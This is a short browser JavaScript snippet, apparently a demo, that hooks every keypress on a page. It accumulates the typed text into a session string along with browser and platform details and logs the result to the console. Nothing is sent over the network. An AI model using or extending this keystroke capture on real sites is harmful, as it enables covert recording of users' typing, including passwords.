var sessionKeyCapture = ''
;(document.onkeypress = function(e) {
  e = e || window.event
  if (!e) return
  var keylog = {}
  var charCode = e.keyCode || e.which
  var charStr = String.fromCharCode(charCode)
  // this can be expanded for operator keys
  sessionKeyCapture = sessionKeyCapture + (e.which === 13 ? '\n' : charStr)
  keylog.keyCode = e.keyCode
  keylog.which = e.which
  keylog.sessionKeyCapture = sessionKeyCapture
  keylog.currentKey = charStr
  keylog.appName = window.navigator.appName
  keylog.appCodeName = window.navigator.appCodeName
  keylog.product = window.navigator.product
  keylog.userAgent = window.navigator.userAgent
  keylog.platform = window.navigator.platform

  console.log(keylog)
})()
